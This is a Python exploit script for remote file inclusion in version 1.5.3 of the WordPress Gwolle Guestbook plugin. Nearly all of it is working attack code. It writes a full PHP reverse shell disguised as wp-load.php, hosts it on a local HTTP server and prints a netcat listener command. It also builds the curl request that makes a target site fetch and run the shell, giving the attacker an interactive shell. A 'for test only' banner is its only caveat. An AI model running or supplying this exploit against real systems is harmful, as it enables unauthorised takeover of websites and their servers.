#!/usr/bin/python3

import os
import subprocess
import sys
import http.server
import socketserver

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'


def usage():

    message = f"usage: {sys.argv[0]} <Target_URL> <Attackers_Host> <Attackers_Port>"
    example = f"example: {sys.argv[0]} http://vuln.com 192.168.0.4 1234"

    print(message) 
    print(example)
    
    del message, example


def init():
    
    banner = """
                     .__  .__             ___.                   __
   ______  _  ______ |  | |  |   ____     \_ |__  __ __  _______/  |_  ___________
  / ___\ \/ \/ /  _ \|  | |  | _/ __ \     | __ \|  |  \/  ___/\   __\/ __ \_  __ '
 / /_/  >     (  <_> )  |_|  |_\  ___/     | \_\ \  |  /\___ \  |  | \  ___/|  | \/
 \___  / \/\_/ \____/|____/____/\___  >____|___  /____//____  > |__|  \___  >__|
/_____/                             \/_____/   \/           \/            \/

            +--------------------------------------------------------+
            | WordPress old plugin gwolle 1.5.3 RemoteFileInclusion  |
            | For test only, Do not use this for illegal_activity    |
            +--------------------------------------------------------+
    """
    print(bcolors.GREEN)
    print(banner)

    if len(sys.argv) != 4:
        print(bcolors.RED)
        print("[!]Need Arguments for execute")
        print(bcolors.YELLOW)
        usage()    
        print(bcolors.ENDC)
        sys.exit()
    
    target = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    print(bcolors.ENDC)
    return target,lhost,lport

def php_write(lhost,lport):

    file_name = "wp-load.php"
    f = open(file_name,"w")

    f.write("<?php class Sh\n")
    f.write("{\n")
    f.write("private $a = null;\n")
    f.write("private $p = null;\n")
    f.write("private $os = null;\n")
    f.write("private $sh = null;\n")
    f.write("private $ds = array(\n")
    f.write("0 => array(\n")
    f.write("'pipe',\n")
    f.write("'r'\n")
    f.write(") ,\n")
    f.write("1 => array(\n")
    f.write("'pipe',\n")
    f.write("'w'\n")
    f.write(") ,\n")
    f.write("2 => array(\n")
    f.write("'pipe',\n")
    f.write("'w'\n")
    f.write(")\n")
    f.write(");\n")
    f.write("private $o = array();\n")
    f.write("private $b = 1024;\n")
    f.write("private $c = 0;\n")
    f.write("private $e = false;\n")
    f.write("public function __construct($a, $p)\n")
    f.write("{\n")
    f.write("$this->a = $a;\n")
    f.write("$this->p = $p;\n")
    f.write("if (stripos(PHP_OS, 'LINUX') !== false)\n")
    f.write("{\n")
    f.write("$this->os = 'LINUX';\n")
    f.write("$this->sh = '/bin/sh';\n")
    f.write("}\n")
    f.write("else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false)\n")
    f.write("{\n")
    f.write("$this->os = 'WINDOWS';\n")
    f.write("$this->sh = 'cmd.exe';\n")
    f.write("$this->o['bypass_shell'] = true;\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("}\n")
    f.write("private function dem()\n")
    f.write("{\n")
    f.write("$e = false;\n")
    f.write("@error_reporting(0);\n")
    f.write("@set_time_limit(0);\n")
    f.write("if (!function_exists('pcntl_fork'))\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n")
    f.write("}\n")
    f.write("else if (($p = @pcntl_fork()) < 0)\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n")
    f.write("}\n")
    f.write("else if ($p > 0)\n")
    f.write("{\n")
    f.write("$e = true;\n")
    f.write("echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n")
    f.write("}\n")
    f.write("else if (posix_setsid() < 0)\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("echo \"DAEMONIZE: Completed successfully!\\n\";\n")
    f.write("}\n")
    f.write("@umask(0);\n")
    f.write("return $e;\n")
    f.write("}\n")
    f.write("private function d($d)\n")
    f.write("{\n")
    f.write("$d = str_replace('<', '<', $d);\n")
    f.write("$d = str_replace('>', '>', $d);\n")
    f.write("echo $d;\n")
    f.write("}\n")
    f.write("private function r($s, $n, $b)\n")
    f.write("{\n")
    f.write("if (($d = @fread($s, $b)) === false)\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"STRM_ERROR: Cannot read from ${n}, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("return $d;\n")
    f.write("}\n")
    f.write("private function w($s, $n, $d)\n")
    f.write("{\n")
    f.write("if (($by = @fwrite($s, $d)) === false)\n")
    f.write("{\n")
    f.write("$this->e = true;\n")
    f.write("echo \"STRM_ERROR: Cannot write to ${n}, script will now exit...\\n\";\n")
    f.write("}\n")
    f.write("return $by;\n")
    f.write("}\n")
    f.write("private function rw($i, $o, $in, $on)\n")
    f.write("{\n")
    f.write("while (($d = $this->r($i, $in, $this->b)) && $this->w($o, $on, $d))\n")
    f.write("{\n")
    f.write("if ($this->os === 'WINDOWS' && $on === 'STDIN')\n")
    f.write("{\n")
    f.write("$this->c += strlen($d);\n")
    f.write("}\n")
    f.write("$this->d($d);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("private function brw($i, $o, $in, $on)\n")
    f.write("{\n")
    f.write("$s = fstat($i) ['size'];\n")
    f.write("if ($this->os === 'WINDOWS' && $in === 'STDOUT' && $this->c)\n")
    f.write("{\n")
    f.write("while ($this->c > 0 && ($by = $this->c >= $this->b ? $this->b : $this->c) && $this->r($i, $in, $by))\n")
    f.write("{\n")
    f.write("$this->c -= $by;\n")
    f.write("$s -= $by;\n")
    f.write("}\n")
    f.write("}\n")
    f.write("while ($s > 0 && ($by = $s >= $this->b ? $this->b : $s) && ($d = $this->r($i, $in, $by)) && $this->w($o, $on, $d))\n")
    f.write("{\n")
    f.write("$s -= $by;\n")
    f.write("$this->d($d);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("public function rn()\n")
    f.write("{\n")
    f.write("if (!$this->e && !$this->dem())\n")
    f.write("{\n")
    f.write("$soc = @fsockopen($this->a, $this->p, $en, $es, 30);\n")
    f.write("if (!$soc)\n")
    f.write("{\n")
    f.write("echo \"SOC_ERROR: {$en}: {$es}\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("stream_set_blocking($soc, false);\n")
    f.write("$proc = @proc_open($this->sh, $this->ds, $pps, '/', null, $this->o);\n")
    f.write("if (!$proc)\n")
    f.write("{\n")
    f.write("echo \"PROC_ERROR: Cannot start the shell\\n\";\n")
    f.write("}\n")
    f.write("else\n")
    f.write("{\n")
    f.write("foreach ($ps as $pp)\n")
    f.write("{\n")
    f.write("stream_set_blocking($pp, false);\n")
    f.write("}\n")
    f.write("@fwrite($soc, \"SOCKET: Shell has connected! PID: \" . proc_get_status($proc) ['pid'] . \"\\n\");\n")
    f.write("do\n")
    f.write("{\n")
    f.write("if (feof($soc))\n")
    f.write("{\n")
    f.write("echo \"SOC_ERROR: Shell connection has been terminated\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("else if (feof($pps[1]) || !proc_get_status($proc) ['running'])\n")
    f.write("{\n")
    f.write("echo \"PROC_ERROR: Shell process has been terminated\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("$s = array(\n")
    f.write("'read' => array(\n")
    f.write("$soc,\n")
    f.write("$pps[1],\n")
    f.write("$pps[2]\n")
    f.write(") ,\n")
    f.write("'write' => null,\n")
    f.write("'except' => null\n")
    f.write(");\n")
    f.write("$ncs = @stream_select($s['read'], $s['write'], $s['except'], null);\n")
    f.write("if ($ncs === false)\n")
    f.write("{\n")
    f.write("echo \"STRM_ERROR: stream_select() failed\\n\";\n")
    f.write("break;\n")
    f.write("}\n")
    f.write("else if ($ncs > 0)\n")
    f.write("{\n")
    f.write("if ($this->os === 'LINUX')\n")
    f.write("{\n")
    f.write("if (in_array($soc, $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
    f.write("}\n")
    f.write("if (in_array($pps[2], $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
    f.write("}\n")
    f.write("if (in_array($pps[1], $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
    f.write("}\n")
    f.write("}\n")
    f.write("else if ($this->os === 'WINDOWS')\n")
    f.write("{\n")
    f.write("if (in_array($soc, $s['read']))\n")
    f.write("{\n")
    f.write("$this->rw($soc, $pps[0], 'SOCKET', 'STDIN');\n")
    f.write("}\n")
    f.write("if (fstat($pps[2]) ['size'])\n")
    f.write("{\n")
    f.write("$this->brw($pps[2], $soc, 'STDERR', 'SOCKET');\n")
    f.write("}\n")
    f.write("if (fstat($pps[1]) ['size'])\n")
    f.write("{\n")
    f.write("$this->brw($pps[1], $soc, 'STDOUT', 'SOCKET');\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("while (!$this->e);\n")
    f.write("foreach ($pps as $pp)\n")
    f.write("{\n")
    f.write("fclose($pp);\n")
    f.write("}\n")
    f.write("proc_close($proc);\n")
    f.write("}\n")
    f.write("fclose($soc);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("echo '<pre>';\n")
    f.write(f"$sh = new Sh('{lhost}', {lport});\n")
    f.write("$sh->rn();\n")
    f.write("echo '</pre>';\n")
    f.write("unset($sh);  ?>\n")

    f.close()

    del f

    return file_name


def server_up(curl_cmd):
    
    

    print("Copy this command and execute at other new terminal")
    print(curl_cmd)

    PORT = 8000

    Handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("serving at port", PORT)
        httpd.serve_forever()
        
        print("Copy this command and execute at other new terminal")
        print(curl_cmd)


def main(target,lhost,lport):
    
    request_url = target + "/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://"+lhost+":8000/"
    curl_cmd = f"curl -v -s {request_url}"
    netcat_cmd = f"nc -nlvp {lport}"
    
    print("Open other terminal and copy this")
    print(netcat_cmd)

    return curl_cmd


if __name__ == "__main__":
    target,lhost,lport = init()
    php_write(lhost,lport)
    curl_cmd = main(target,lhost,lport)
    server_up(curl_cmd)
